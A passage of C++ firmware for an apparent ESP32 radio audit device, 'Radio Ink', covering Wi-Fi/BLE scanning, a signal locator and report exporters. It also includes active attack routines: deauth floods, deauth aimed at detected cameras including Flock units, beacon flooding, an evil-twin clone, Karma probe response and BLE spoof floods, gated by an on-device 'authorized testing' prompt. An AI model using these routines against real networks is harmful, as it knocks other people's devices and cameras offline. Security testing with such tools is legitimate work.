      if (lastDeepScanWifiIndex >= 0 && lastDeepScanWifiIndex < static_cast<int>(wifiFindings.size())) {
        bool& marked = wifiFindings[lastDeepScanWifiIndex].marked;
        marked = !marked;
        status = marked ? "Marked for deauth" : "Unmarked";
      }
      requestUpdate();
      return;
    case 1:
#if defined(RADIO_AUDIT_ENABLE_ACTIVE)
      if (lastDeepScanWifiIndex >= 0 && lastDeepScanWifiIndex < static_cast<int>(wifiFindings.size())) {
        targetMenuOpen = false;
        const auto& w = wifiFindings[lastDeepScanWifiIndex];
        beginDeauth({lastDeepScanWifiIndex}, w.ssid.empty() ? w.bssid : w.ssid);
      }
#endif
      return;
    case 2:
      targetMenuOpen = false;
      startLocator();
      return;
    case 4:
#if defined(RADIO_AUDIT_ENABLE_BLE)
      gattEnumerate();
#endif
      return;
    case 5:
#if defined(RADIO_AUDIT_ENABLE_ACTIVE)
      targetMenuOpen = false;
      startCameraDeauth();
#endif
      return;
    case 6:
#if defined(RADIO_AUDIT_ENABLE_ACTIVE) && defined(RADIO_AUDIT_ENABLE_BLE)
      if (!requireAuthorization()) return;  // one-time on-device confirm; detail view stays put
      targetMenuOpen = false;
      playFindMySound(/*stop=*/false);
#endif
      return;
    case 7:
#if defined(RADIO_AUDIT_ENABLE_ACTIVE) && defined(RADIO_AUDIT_ENABLE_BLE)
      if (!requireAuthorization()) return;
      targetMenuOpen = false;
      playFindMySound(/*stop=*/true);
#endif
      return;
    case 3:
    default:
      targetMenuOpen = false;
      requestUpdate();
      return;
  }
}

void RadioAuditActivity::renderTargetMenu() {
  const auto& metrics = UITheme::getInstance().getMetrics();
  const auto pageWidth = renderer.getScreenWidth();
  const auto pageHeight = renderer.getScreenHeight();
  renderer.clearScreen();
  const int contentTop = metrics.topPadding + metrics.headerHeight + metrics.verticalSpacing;

  GUI.drawHeader(renderer, Rect{0, metrics.topPadding, pageWidth, metrics.headerHeight}, targetTitle.c_str(),
                 "Actions");
  const int n = static_cast<int>(targetMenuCodes.size());
  const int listHeight = pageHeight - contentTop - metrics.buttonHintsHeight - metrics.verticalSpacing;
  GUI.drawList(
      renderer, Rect{0, contentTop, pageWidth, listHeight}, n, targetMenuSel,
      [this](int index) { return targetMenuLabel(targetMenuCodes[index]); }, nullptr, nullptr);

  const auto labels = mappedInput.mapLabels("Back", "Select", "Up", "Down");
  UITheme::getInstance().suppressBrandLogoOnce();  // menu view: no brand logo
  GUI.drawButtonHints(renderer, labels.btn1, labels.btn2, labels.btn3, labels.btn4);
  renderer.displayBuffer();
}

#if defined(RADIO_AUDIT_ENABLE_ACTIVE)
bool RadioAuditActivity::requireAuthorization() {
  if (g_activeAuthorized) return true;
  auto handler = [this](const ActivityResult& res) {
    if (!res.isCancelled) g_activeAuthorized = true;  // confirmed for the rest of the session
    requestUpdate();
  };
  startActivityForResult(
      std::make_unique<ConfirmationActivity>(renderer, mappedInput, std::string("Authorized testing only"),
                                             std::string("Transmit attack frames?")),
      handler);
  return false;  // caller aborts; user repeats the action once authorized
}

void RadioAuditActivity::handshakeDeauthTarget() {
  if (!requireAuthorization()) return;
  HsSsidEntry* ap = hsBestAp();
  if (!ap) {
    status = "No AP yet - wait for a beacon";
    requestUpdate();
    return;
  }
  // Lock to the target's channel and dwell so the forced reconnect is captured.
  captureChannel = ap->channel ? ap->channel : captureChannel;
  captureChannelLocked = true;
  esp_wifi_set_channel(captureChannel, WIFI_SECOND_CHAN_NONE);
  attackFrames += sendDeauthBurst(ap->bssid, BROADCAST_MAC, 16);
  status = std::string("Deauth ") + ap->ssid + " CH" + std::to_string(captureChannel) + " (" +
           std::to_string(attackFrames) + " tx)";
  requestUpdate();
}

void RadioAuditActivity::beginDeauth(std::vector<int> targets, const std::string& label) {
  if (!requireAuthorization()) return;  // aborts if not yet confirmed; detail view stays put
  if (targets.empty()) {
    status = "No targets - scan and mark APs first";
    state = State::DONE;
    showingTarget = false;
    showingDetails = false;
    showingFindings = false;
    requestUpdate();
    return;
  }
  prepWifiSta();
  attackMode = AttackMode::Deauth;
  attackTargets = std::move(targets);
  attackScopeLabel = label;
  attackFrames = 0;
  attackTargetIdx = 0;
  attackLastMs = 0;
  attackStatusLine = "starting...";
  captureLastFlushMs = millis();
  showingTarget = false;
  showingDetails = false;
  showingFindings = false;
  state = State::ATTACKING;
  status = std::string("Deauth: ") + label + " (" + std::to_string(attackTargets.size()) + " AP)";
  requestUpdate();
}

void RadioAuditActivity::startDeauthAttack() {
  std::vector<int> all;
  all.reserve(wifiFindings.size());
  for (int i = 0; i < static_cast<int>(wifiFindings.size()); i++) all.push_back(i);
  beginDeauth(std::move(all), "all APs");
}

void RadioAuditActivity::startDeauthSelected() {
  std::vector<int> sel;
  sel.reserve(wifiFindings.size());
  for (int i = 0; i < static_cast<int>(wifiFindings.size()); i++)
    if (wifiFindings[i].marked) sel.push_back(i);
  beginDeauth(std::move(sel), "selected");
}

void RadioAuditActivity::startDeauthCameras() {
  // Target only WiFi APs fingerprinted as cameras. Uses the strong signals --
  // SSID fingerprint (incl. Flock) and dedicated camera/Flock MAC OUIs -- and
  // intentionally NOT the broad vendor heuristic, so we don't knock generic
  // Amazon/Google gear off the air.
  std::vector<int> cams;
  cams.reserve(wifiFindings.size());
  for (int i = 0; i < static_cast<int>(wifiFindings.size()); i++) {
    const auto& w = wifiFindings[i];
    const std::string vendor = macVendor(w.bssid);
    if (!cameraFingerprintReason(w.ssid, vendor).empty() || !cameraMacReason(w.bssid).empty()) cams.push_back(i);
  }
  if (cams.empty()) {
    status = "No cameras found - run a WiFi/Camera scan first";
    state = State::DONE;
    showingTarget = false;
    showingDetails = false;
    showingFindings = false;
    requestUpdate();
    return;
  }
  beginDeauth(std::move(cams), "cameras");
}

void RadioAuditActivity::startBeaconFlood() {
  if (!requireAuthorization()) return;
  prepWifiSta();
  attackMode = AttackMode::Beacon;
  attackFrames = 0;
  attackLastMs = 0;
  captureChannel = 1;
  attackStatusLine = "starting...";
  captureLastFlushMs = millis();
  state = State::ATTACKING;
  status = "Beacon flood";
  requestUpdate();
}

void RadioAuditActivity::startEvilTwin() {
  if (!requireAuthorization()) return;
  // Clone an SSID: prefer a single marked AP, else the strongest named AP, else
  // a generic open name. EvilTwinActivity owns the AP/DNS/portal lifecycle.
  std::string ssid;
  for (const auto& w : wifiFindings)
    if (w.marked && !w.ssid.empty()) {
      ssid = w.ssid;
      break;
    }
  if (ssid.empty())
    for (const auto& w : wifiFindings)
      if (!w.ssid.empty()) {
        ssid = w.ssid;  // wifiFindings is sorted by RSSI, so this is the strongest
        break;
      }
  if (ssid.empty()) ssid = "Free WiFi";

  startActivityForResult(std::make_unique<EvilTwinActivity>(renderer, mappedInput, ssid),
                         [this](const ActivityResult&) { requestUpdate(); });
}

void RadioAuditActivity::startBleSpoof() {
  if (!requireAuthorization()) return;
#if defined(RADIO_AUDIT_ENABLE_BLE)
  shutdownBleController();
  WiFi.scanDelete();
  WiFi.disconnect(false, false);
  WiFi.mode(WIFI_OFF);
  delay(150);
  if (ESP.getFreeHeap() < BLE_HEAP_FLOOR_START) {
    status = "BLE spoof: low memory";
    state = State::DONE;
    requestUpdate();
    return;
  }
  if (!bleReady) {
    BLEDevice::init("RadioInk");
    bleReady = true;
  }
  attackMode = AttackMode::BleSpoof;
  attackFrames = 0;
  attackLastMs = 0;
  attackStatusLine = "advertising...";
  captureLastFlushMs = millis();
  state = State::ATTACKING;
  status = "BLE spoof flood";
  requestUpdate();
#else
  status = "BLE disabled in this build";
  state = State::DONE;
  requestUpdate();
#endif
}

void RadioAuditActivity::startKarma() {
  if (!requireAuthorization()) return;
  prepWifiSta();

  g_karma = makeUniqueNoThrow<KarmaState>();  // zero-initialized on the heap
  if (!g_karma) {
    LOG_ERR("RADIO", "Karma: OOM");
    status = "Karma: out of memory";
    state = State::DONE;
    requestUpdate();
    return;
  }

  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(&karmaProbeCb);
  wifi_promiscuous_filter_t filter = {};
  filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous(true);
  captureChannel = 1;
  esp_wifi_set_channel(captureChannel, WIFI_SECOND_CHAN_NONE);

  g_karma->active = true;
  attackMode = AttackMode::Karma;
  attackFrames = 0;
  attackLastMs = 0;
  attackStatusLine = "harvesting probes...";
  captureLastFlushMs = millis();
  state = State::ATTACKING;
  status = "Karma / probe response";
  requestUpdate();
}

void RadioAuditActivity::startCameraDeauth() {
  if (!requireAuthorization()) return;  // aborts if not yet confirmed
  prepWifiSta();
  attackMode = AttackMode::CameraDeauth;
  attackFrames = 0;
  attackTargetIdx = 0;
  attackLastMs = 0;
  attackStatusLine = "starting...";
  captureLastFlushMs = millis();
  captureChannel = (targetCamChannel >= 1 && targetCamChannel <= 13) ? static_cast<uint8_t>(targetCamChannel) : 1;
  esp_wifi_set_channel(captureChannel, WIFI_SECOND_CHAN_NONE);
  showingTarget = false;
  showingCameraList = false;
  showingDetails = false;
  state = State::ATTACKING;
  status = std::string("Deauth ") + (targetCamHasAp ? "camera " : "AP ") + macToString(targetCamMac);
  requestUpdate();
}

void RadioAuditActivity::stopAttack() {
#if defined(RADIO_AUDIT_ENABLE_BLE)
  if (attackMode == AttackMode::BleSpoof) {
    BLEDevice::getAdvertising()->stop();
    shutdownBleController();
  }
#endif
  if (attackMode == AttackMode::Karma) {
    if (g_karma) g_karma->active = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    g_karma.reset();  // free the PNL table back to the heap
  }
  WiFi.disconnect(false, false);
  WiFi.mode(WIFI_OFF);
  delay(100);
  state = State::DONE;
  status = std::string("Attack stopped, ") + std::to_string(attackFrames) + " frames sent";
  requestUpdate();
}

void RadioAuditActivity::renderAttack() {
  const auto& metrics = UITheme::getInstance().getMetrics();
  const auto pageWidth = renderer.getScreenWidth();
  renderer.clearScreen();
  const int contentTop = metrics.topPadding + metrics.headerHeight + metrics.verticalSpacing;
  const int summaryX = metrics.contentSidePadding;

  const char* title = attackMode == AttackMode::Deauth         ? "Deauth Attack"
                      : attackMode == AttackMode::Beacon       ? "Beacon Flood"
                      : attackMode == AttackMode::Karma        ? "Karma / Probe Resp"
                      : attackMode == AttackMode::CameraDeauth ? "Deauth Camera"
                                                               : "BLE Spoof";
  GUI.drawHeader(renderer, Rect{0, metrics.topPadding, pageWidth, metrics.headerHeight}, title, status.c_str());

  int y = contentTop;
  renderer.drawText(UI_12_FONT_ID, summaryX, y, (String("Frames sent: ") + attackFrames).c_str(), true,
                    EpdFontFamily::BOLD);
  y += renderer.getLineHeight(UI_12_FONT_ID) + 8;
  if (attackMode == AttackMode::Deauth) {
    renderer.drawText(SMALL_FONT_ID, summaryX, y,
                      (String("Scope: ") + attackScopeLabel.c_str() + "  (" +
                       String(static_cast<unsigned>(attackTargets.size())) + " APs)")
                          .c_str());
    y += renderer.getLineHeight(SMALL_FONT_ID) + 6;
  } else if (attackMode == AttackMode::Karma) {
    const int pnl = g_karma ? g_karma->count : 0;
    const unsigned reqs = g_karma ? g_karma->probeReqs : 0;
    renderer.drawText(SMALL_FONT_ID, summaryX, y, (String("PNL: ") + pnl + " SSIDs   Probes: " + reqs).c_str());
    y += renderer.getLineHeight(SMALL_FONT_ID) + 6;
  }
  renderer.drawText(UI_12_FONT_ID, summaryX, y,
                    renderer
                        .truncatedText(UI_12_FONT_ID, (String("Target: ") + attackStatusLine.c_str()).c_str(),
                                       pageWidth - summaryX * 2)
                        .c_str(),
                    true, EpdFontFamily::BOLD);
  y += renderer.getLineHeight(UI_12_FONT_ID) + 8;
  const char* blurb = attackMode == AttackMode::Deauth         ? "Kicking all clients off targeted APs."
                      : attackMode == AttackMode::Beacon       ? "Spamming fake beacons across channels."
                      : attackMode == AttackMode::Karma        ? "Beaconing the SSIDs clients probe for."
                      : attackMode == AttackMode::CameraDeauth ? "Knocking the camera off its network."
                                                               : "Flooding phantom BLE advertisers.";
  renderer.drawText(SMALL_FONT_ID, summaryX, y, blurb);

  const auto labels = mappedInput.mapLabels("Stop", "Stop", "", "");
  UITheme::getInstance().suppressBrandLogoOnce();  // live data view: no brand logo
  GUI.drawButtonHints(renderer, labels.btn1, labels.btn2, labels.btn3, labels.btn4);
  renderer.displayBuffer();
}
#endif  // RADIO_AUDIT_ENABLE_ACTIVE

void RadioAuditActivity::showChannelUsage() {
  if (wifiFindings.empty()) {
    status = "Run a WiFi scan first";
    requestUpdate();
    return;
  }
  int counts[15] = {};
  int strongest[15];
  for (int i = 0; i < 15; i++) strongest[i] = -127;
  for (const auto& w : wifiFindings) {
    if (w.channel >= 1 && w.channel <= 14) {
      counts[w.channel]++;
      if (w.rssi > strongest[w.channel]) strongest[w.channel] = w.rssi;
    }
  }
  int maxCount = 1;
  for (int ch = 1; ch <= 14; ch++)
    if (counts[ch] > maxCount) maxCount = counts[ch];

  targetTitle = "Channel Usage";
  targetLines.clear();
  targetScroll = 0;
  targetFromList = false;
  targetLocatable = false;
  for (int ch = 1; ch <= 14; ch++) {
    if (counts[ch] == 0) continue;
    int bars = counts[ch] * 12 / maxCount;
    if (bars < 1) bars = 1;
    // Co-channel/adjacent-channel congestion: 2.4GHz channels within +/-4 overlap
    // significantly, so this counts everything nearby, not just this channel.
    int nearby = 0;
    for (int k = std::max(1, ch - 4); k <= std::min(14, ch + 4); k++) nearby += counts[k];
    const char* congestion = nearby >= 8 ? "Congested" : nearby >= 4 ? "Busy" : "Clear";
    char head[8];
    snprintf(head, sizeof(head), "CH%-2d ", ch);
    targetLines.push_back(std::string(head) + std::string(bars, '#') + " " + std::to_string(counts[ch]) + " (" +
                          std::to_string(strongest[ch]) + "dBm)  " + congestion);
  }
  status = "Channel usage";
  showingTarget = true;
  showingDetails = false;
  showingFindings = false;
  requestUpdate();
}

void RadioAuditActivity::loadWatchlist() {
  watchlist.clear();
  if (!Storage.exists(WATCHLIST_PATH)) return;
  const String content = Storage.readFile(WATCHLIST_PATH);
  int start = 0;
  while (start < static_cast<int>(content.length())) {
    int nl = content.indexOf('\n', start);
    if (nl < 0) nl = content.length();
    String line = content.substring(start, nl);
    line.trim();
    line.toUpperCase();
    if (line.length() && line[0] != '#') watchlist.push_back(std::string(line.c_str()));
    start = nl + 1;
  }
}

void RadioAuditActivity::diffAndSaveSnapshot() {
  // Current device keys + human labels.
  std::vector<std::pair<std::string, std::string>> current;
  for (const auto& w : wifiFindings) current.emplace_back("W|" + upperStr(w.bssid), w.ssid.empty() ? w.bssid : w.ssid);
  for (const auto& b : bleFindings)
    current.emplace_back("B|" + upperStr(b.address), b.name.empty() ? b.address : b.name);

  std::vector<std::pair<std::string, std::string>> previous;
  const bool hadPrevious = Storage.exists(SNAPSHOT_PATH);
  if (hadPrevious) {
    const String content = Storage.readFile(SNAPSHOT_PATH);
    int start = 0;
    while (start < static_cast<int>(content.length())) {
      int nl = content.indexOf('\n', start);
      if (nl < 0) nl = content.length();
      const String line = content.substring(start, nl);
      const int tab = line.indexOf('\t');
      if (tab > 0) previous.emplace_back(line.substring(0, tab).c_str(), line.substring(tab + 1).c_str());
      start = nl + 1;
    }
  }

  auto contains = [](const std::vector<std::pair<std::string, std::string>>& v, const std::string& key) {
    for (const auto& e : v)
      if (e.first == key) return true;
    return false;
  };

  if (hadPrevious) {
    for (const auto& cur : current)
      if (!contains(previous, cur.first)) addAuditFinding("INFO", "New since last scan", cur.second + " appeared.");
    for (const auto& prev : previous)
      if (!contains(current, prev.first))
        addAuditFinding("INFO", "Gone since last scan", prev.second + " disappeared.");
  }

  String out;
  for (const auto& cur : current) out += String(cur.first.c_str()) + "\t" + cur.second.c_str() + "\n";
  Storage.writeFile(SNAPSHOT_PATH, out);
}

void RadioAuditActivity::startLocator() {
  if (!targetLocatable) return;
  locating = true;
  showingTarget = false;
  locBestRssi = -127;
  locCurRssi = -127;
  locPrevRssi = -127;
  locHasSignal = false;
  locLastSampleMs = 0;

  if (!targetLocBle) {
    shutdownBleController();
    WiFi.scanDelete();
    WiFi.disconnect(false, false);
    WiFi.mode(WIFI_STA);
    delay(100);
    memset(&g_targetCap, 0, sizeof(g_targetCap));
    memcpy(g_targetCap.bssid, targetLocBssid, 6);
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(&targetPromiscuousCb);
    wifi_promiscuous_filter_t filter = {};
    filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(static_cast<uint8_t>(targetLocChannel), WIFI_SECOND_CHAN_NONE);
    g_targetCap.active = true;
  } else {
#if defined(RADIO_AUDIT_ENABLE_BLE)
    WiFi.scanDelete();
    WiFi.disconnect(false, false);
    WiFi.mode(WIFI_OFF);
    delay(200);
    if (!bleReady) {
      BLEDevice::init("RadioInk");
      bleScan = BLEDevice::getScan();
      bleReady = true;
    }
    if (!bleScan) {  // controller init failed - don't enter the locator
      locating = false;
      status = "BLE init failed";
      showingTarget = true;
      requestUpdate();
      return;
    }
    bleScan->setActiveScan(false);
    bleScan->setInterval(320);
    bleScan->setWindow(80);
#endif
  }
  status = "Locating...";
  requestUpdate();
}

void RadioAuditActivity::stopLocator() {
  locating = false;
  if (!targetLocBle) {
    g_targetCap.active = false;
    esp_wifi_set_promiscuous(false);
    WiFi.scanDelete();
    WiFi.disconnect(false, false);
    WiFi.mode(WIFI_OFF);
    delay(50);
  } else {
    shutdownBleController();
  }
}

void RadioAuditActivity::locatorSample() {
  if (!targetLocBle) {
    if (g_targetCap.rssiSamples > 0) {
      locCurRssi = static_cast<int>(g_targetCap.rssiSum / static_cast<long>(g_targetCap.rssiSamples));
      locHasSignal = true;
    } else {
      locHasSignal = false;
    }
    g_targetCap.rssiSum = 0;
    g_targetCap.rssiSamples = 0;
  } else {
#if defined(RADIO_AUDIT_ENABLE_BLE)
    BLEScanResults* results = bleScan->start(1, false);
    const int count = results ? results->getCount() : 0;
    bool seen = false;
    for (int i = 0; i < count; i++) {
      BLEAdvertisedDevice device = results->getDevice(i);
      if (std::string(device.getAddress().toString().c_str()) == targetLocAddr) {
        locCurRssi = device.getRSSI();
        seen = true;
        break;
      }
    }
    bleScan->clearResults();
    locHasSignal = seen;
#endif
  }
  if (locHasSignal && locCurRssi > locBestRssi) locBestRssi = locCurRssi;
}

void RadioAuditActivity::renderLocator() {
  const auto& metrics = UITheme::getInstance().getMetrics();
  const auto pageWidth = renderer.getScreenWidth();
  renderer.clearScreen();
  const int contentTop = metrics.topPadding + metrics.headerHeight + metrics.verticalSpacing;
  const int summaryX = metrics.contentSidePadding;

  GUI.drawHeader(renderer, Rect{0, metrics.topPadding, pageWidth, metrics.headerHeight},
                 ("Locate: " + targetLocName).c_str(), status.c_str());

  int y = contentTop;
  if (!locHasSignal) {
    renderer.drawText(UI_12_FONT_ID, summaryX, y, "-- no signal --", true, EpdFontFamily::BOLD);
  } else {
    // Map RSSI [-100..-30] -> 0..30 bar segments.
    int level = (locCurRssi + 100) * 30 / 70;
    if (level < 0) level = 0;
    if (level > 30) level = 30;
    renderer.drawText(UI_12_FONT_ID, summaryX, y, (String("RSSI: ") + locCurRssi + " dBm").c_str(), true,
                      EpdFontFamily::BOLD);
    y += renderer.getLineHeight(UI_12_FONT_ID) + 8;
    const std::string bar = "[" + std::string(level, '#') + std::string(30 - level, '.') + "]";
    renderer.drawText(UI_12_FONT_ID, summaryX, y, bar.c_str(), true, EpdFontFamily::BOLD);
    y += renderer.getLineHeight(UI_12_FONT_ID) + 8;
    renderer.drawText(SMALL_FONT_ID, summaryX, y, (String("Best (closest): ") + locBestRssi + " dBm").c_str());
    y += renderer.getLineHeight(SMALL_FONT_ID) + 8;
    const char* trend = "= holding";
    if (locPrevRssi > -127) {
      if (locCurRssi - locPrevRssi >= 2)
        trend = "^^ WARMER (closer)";
      else if (locPrevRssi - locCurRssi >= 2)
        trend = "vv colder (farther)";
    }
    renderer.drawText(UI_12_FONT_ID, summaryX, y, trend, true, EpdFontFamily::BOLD);
  }

  const auto labels = mappedInput.mapLabels("Back", "Back", "", "");
  UITheme::getInstance().suppressBrandLogoOnce();  // log view: no brand logo
  GUI.drawButtonHints(renderer, labels.btn1, labels.btn2, labels.btn3, labels.btn4);
  renderer.displayBuffer();
}

String RadioAuditActivity::makeTextReport() const {
  String out;
  out += "RADIO INK REPORT\n";
  out += "================\n";
  out += "Time: ";
  out += (scanTime.empty() ? "n/a" : scanTime.c_str());
  out += "\nMode: ";
  out += scanModeName();
  out += "\nPasses: ";
  out += scanTotalPasses;
  out += "\n";
  out += makeRiskSummary();
  out += "\n";
  out += "WiFi APs: ";
  out += wifiFindings.size();
  out += "\nBLE dev: ";
  out += bleFindings.size();
  out += "\nProbes: ";
  out += probeFindings.size();
  out += "\nFindings: ";
  out += auditFindings.size();
  out += "\n\nAUDIT FINDINGS\n--------------\n";
  for (size_t i = 0; i < auditFindings.size(); i++) {
    const auto& f = auditFindings[i];
    out += String(i + 1) + ". [" + f.severity.c_str() + "] " + f.title.c_str() + "\n";
    out += String("   ") + f.detail.c_str() + "\n";
  }
  out += "\nWIFI\n----\n";
  for (size_t i = 0; i < wifiFindings.size(); i++) {
    const auto& w = wifiFindings[i];
    out += String(i + 1) + ". " + (w.ssid.empty() ? "<hidden>" : w.ssid.c_str()) + "\n";
    out += String("   ") + w.bssid.c_str() + " CH" + w.channel + " seen " + w.seenCount + "/" + scanTotalPasses + "\n";
    out += String("   avg ") + w.rssi + " dBm min " + w.rssiMin + " max " + w.rssiMax + " " + w.auth.c_str() + "\n";
  }
  out += "\nBLE\n---\n";
  for (size_t i = 0; i < bleFindings.size(); i++) {
    const auto& b = bleFindings[i];
    out += String(i + 1) + ". " + b.address.c_str() + "\n";
    out += String("   ") + (b.name.empty() ? "<unnamed>" : b.name.c_str()) + "\n";
    out += String("   avg ") + b.rssi + " dBm min " + b.rssiMin + " max " + b.rssiMax + " seen " + b.seenCount + "/" +
           scanTotalPasses;
    if (b.hasTxPower) out += String(" TX ") + b.txPower;
    out += "\n";
  }
  out += "\nPROBES\n------\n";
  for (size_t i = 0; i < probeFindings.size(); i++) {
    const auto& p = probeFindings[i];
    const std::string vendor = macVendor(p.client);
    out += String(i + 1) + ". " + p.client.c_str();
    if (!vendor.empty()) out += String(" ") + vendor.c_str();
    out += "\n";
    out += String("   SSID ") + probeSsidLabel(p.ssid).c_str() + " RSSI " + p.rssi + " dBm\n";
  }
  return out;
}

String RadioAuditActivity::makeCsvReport() const {
  String out =
      "type,index,severity,title,detail,ssid,bssid,address,rssi,rssi_min,rssi_max,seen_count,pass_count,channel,auth,"
      "name,tx_power,manufacturer,vendor\n";
  for (size_t i = 0; i < auditFindings.size(); i++) {
    const auto& f = auditFindings[i];
    out += String("finding,") + (i + 1) + "," + csvEscape(f.severity) + "," + csvEscape(f.title) + "," +
           csvEscape(f.detail) + ",,,,,,,,,,,,,,\n";
  }
  for (size_t i = 0; i < wifiFindings.size(); i++) {
    const auto& w = wifiFindings[i];
    out += String("wifi,") + (i + 1) + ",,,," + csvEscape(w.ssid) + "," + csvEscape(w.bssid) + ",,";
    out += String(w.rssi) + "," + w.rssiMin + "," + w.rssiMax + "," + w.seenCount + "," + scanTotalPasses + ",";
    out += String(w.channel) + "," + csvEscape(w.auth) + ",,,," + csvEscape(macVendor(w.bssid)) + "\n";
  }
  for (size_t i = 0; i < bleFindings.size(); i++) {
    const auto& b = bleFindings[i];
    out += String("ble,") + (i + 1) + ",,,,,,," + csvEscape(b.address) + ",";
    out += String(b.rssi) + "," + b.rssiMin + "," + b.rssiMax + "," + b.seenCount + "," + scanTotalPasses + ",,,";
    out += csvEscape(b.name) + ",";
    out += (b.hasTxPower ? String(b.txPower) : String("")) + "," + csvEscape(b.manufacturerHex) + "," +
           csvEscape(macVendor(b.address)) + "\n";
  }
  for (size_t i = 0; i < probeFindings.size(); i++) {
    const auto& p = probeFindings[i];
    out += String("probe,") + (i + 1) + ",,,," + csvEscape(p.ssid) + ",," + csvEscape(p.client) + ",";
    out += String(p.rssi) + ",,,,," + ",,,," + csvEscape(macVendor(p.client)) + "\n";
  }
  return out;
}

String RadioAuditActivity::makeJsonReport() const {
  String out;
  out += "{\n";
  out += "  \"tool\": \"Radio Ink\",\n";
  out += "  \"scan_time\": ";
  out += jsonEscape(scanTime.empty() ? "n/a" : scanTime.c_str());
  out += ",\n";
  out += "  \"scan_mode\": ";
  out += jsonEscape(scanModeName().c_str());
  out += ",\n";
  out += "  \"scan_passes\": ";
  out += scanTotalPasses;
  out += ",\n";
  out += "  \"uptime_seconds\": ";
  out += millis() / 1000;
  out += ",\n";
  out += "  \"summary\": {\n";
  out += "    \"wifi_count\": ";
  out += wifiFindings.size();
  out += ",\n";
  out += "    \"ble_count\": ";
  out += bleFindings.size();
  out += ",\n";
  out += "    \"probe_count\": ";
  out += probeFindings.size();
  out += ",\n";
  out += "    \"findings_count\": ";
  out += auditFindings.size();
  out += ",\n";
  out += "    \"risk\": ";
  out += jsonEscape(makeRiskSummary().c_str());
  out += "\n";
  out += "  },\n";
  out += "  \"findings\": [\n";
  for (size_t i = 0; i < auditFindings.size(); i++) {
    const auto& f = auditFindings[i];
    out += "    {\"index\": ";
    out += i + 1;
    out += ", \"severity\": ";
    out += jsonEscape(f.severity);
    out += ", \"title\": ";
    out += jsonEscape(f.title);
    out += ", \"detail\": ";
    out += jsonEscape(f.detail);
    out += "}";
    if (i + 1 < auditFindings.size()) out += ",";
    out += "\n";
  }
  out += "  ],\n";
  out += "  \"wifi\": [\n";
  for (size_t i = 0; i < wifiFindings.size(); i++) {
    const auto& w = wifiFindings[i];
    out += "    {\"index\": ";
    out += i + 1;
    out += ", \"ssid\": ";
    out += jsonEscape(w.ssid);
    out += ", \"bssid\": ";
    out += jsonEscape(w.bssid);
    out += ", \"rssi\": ";
    out += w.rssi;
    out += ", \"rssi_min\": ";
    out += w.rssiMin;
    out += ", \"rssi_max\": ";
    out += w.rssiMax;
    out += ", \"seen_count\": ";
    out += w.seenCount;
    out += ", \"channel\": ";
    out += w.channel;
    out += ", \"auth\": ";
    out += jsonEscape(w.auth);
    out += ", \"hidden\": ";
    out += w.hidden ? "true" : "false";
    out += "}";
    if (i + 1 < wifiFindings.size()) out += ",";
    out += "\n";
  }
  out += "  ],\n";
  out += "  \"ble\": [\n";
  for (size_t i = 0; i < bleFindings.size(); i++) {
    const auto& b = bleFindings[i];
    out += "    {\"index\": ";
    out += i + 1;
    out += ", \"address\": ";
    out += jsonEscape(b.address);
    out += ", \"name\": ";
    out += jsonEscape(b.name);
    out += ", \"rssi\": ";
    out += b.rssi;
    out += ", \"rssi_min\": ";
    out += b.rssiMin;
    out += ", \"rssi_max\": ";
    out += b.rssiMax;
    out += ", \"seen_count\": ";
    out += b.seenCount;
    out += ", \"tx_power\": ";
    if (b.hasTxPower) {
      out += b.txPower;
    } else {
      out += "null";
    }
    out += ", \"manufacturer\": ";
    out += jsonEscape(b.manufacturerHex);
    out += "}";
    if (i + 1 < bleFindings.size()) out += ",";
    out += "\n";
  }
  out += "  ],\n";
  out += "  \"probes\": [\n";
  for (size_t i = 0; i < probeFindings.size(); i++) {
    const auto& p = probeFindings[i];
    out += "    {\"index\": ";
    out += i + 1;
    out += ", \"client\": ";
    out += jsonEscape(p.client);
    out += ", \"ssid\": ";
    out += jsonEscape(p.ssid);
    out += ", \"ssid_label\": ";
    out += jsonEscape(probeSsidLabel(p.ssid));
    out += ", \"rssi\": ";
    out += p.rssi;
    out += ", \"vendor\": ";
    out += jsonEscape(macVendor(p.client));
    out += "}";
    if (i + 1 < probeFindings.size()) out += ",";
    out += "\n";
  }
  out += "  ]\n";
  out += "}\n";
  return out;
}

String RadioAuditActivity::makeWigleReport() const {
  // Optional manual location ("lat,lon" in location.txt). No GPS on the X4, so
  // without it every row is 0,0 -- a valid-format survey log, not WiGLE-uploadable.
  String lat = "0", lon = "0";
  if (Storage.exists(LOCATION_PATH)) {
    String loc = Storage.readFile(LOCATION_PATH);
    loc.trim();
    const int comma = loc.indexOf(',');
    if (comma > 0) {
      lat = loc.substring(0, comma);
      lon = loc.substring(comma + 1);
      lat.trim();
      lon.trim();
    }
  }

  const String when = wigleTimestamp().c_str();
  String out =
      "WigleWifi-1.4,appRelease=1.0.0,model=Xteink X4,release=1.0.0,device=Radio Ink,display=eink,board=esp32c3,"
      "brand=Radio Ink\n";
  out +=
      "MAC,SSID,AuthMode,FirstSeen,Channel,RSSI,CurrentLatitude,CurrentLongitude,AltitudeMeters,"
      "AccuracyMeters,Type\n";

  for (const auto& w : wifiFindings) {
    out += String(w.bssid.c_str()) + "," + csvEscape(w.ssid) + "," + wigleAuth(w.auth).c_str() + "," + when + ",";
    out += String(w.channel) + "," + w.rssi + "," + lat + "," + lon + ",0,0,WIFI\n";
  }
  // BLE rows: WiGLE Type=BLE, MAC=address, SSID=device name, no channel/auth.
  for (const auto& b : bleFindings) {
    out += String(b.address.c_str()) + "," + csvEscape(b.name) + ",," + when + ",";
    out += String("0,") + b.rssi + "," + lat + "," + lon + ",0,0,BLE\n";
  }
  return out;
}

String RadioAuditActivity::makeRiskSummary() const {
  int openOrWep = 0;
  int weakWifi = 0;
  int hiddenWifi = 0;
  int closeBle = 0;
  int directedProbes = 0;
  int cameraHits = 0;

  for (const auto& w : wifiFindings) {
    if (w.auth == "OPEN" || w.auth == "WEP") openOrWep++;
    if (w.auth == "WEP" || w.auth == "WPA") weakWifi++;
    if (w.hidden) hiddenWifi++;
